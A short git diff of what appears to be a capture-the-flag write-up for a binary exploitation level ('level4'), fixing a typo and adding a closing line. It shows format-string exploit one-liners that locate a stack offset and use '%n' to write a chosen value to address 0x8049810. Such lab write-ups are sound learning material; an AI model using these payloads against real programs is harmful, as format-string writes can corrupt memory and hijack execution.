@@ -77,7 +77,7 @@ Let's do the same thing to level4. The "m" address is "0x8049810"
 	$ python -c 'print "\x10\x98\x04\x08"+"%12$x"' | ./level4
 	8049810
 
-It's word, let's inject the number we need : 16930116 - 4
+It works, let's inject the number we need : 16930116 - 4
 
 The previous method will be too long
 
@@ -92,3 +92,5 @@ We can generate our number of bytes like that
 With the "%n" modifier
 
 	$ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4
+
+Script it for reproduice!
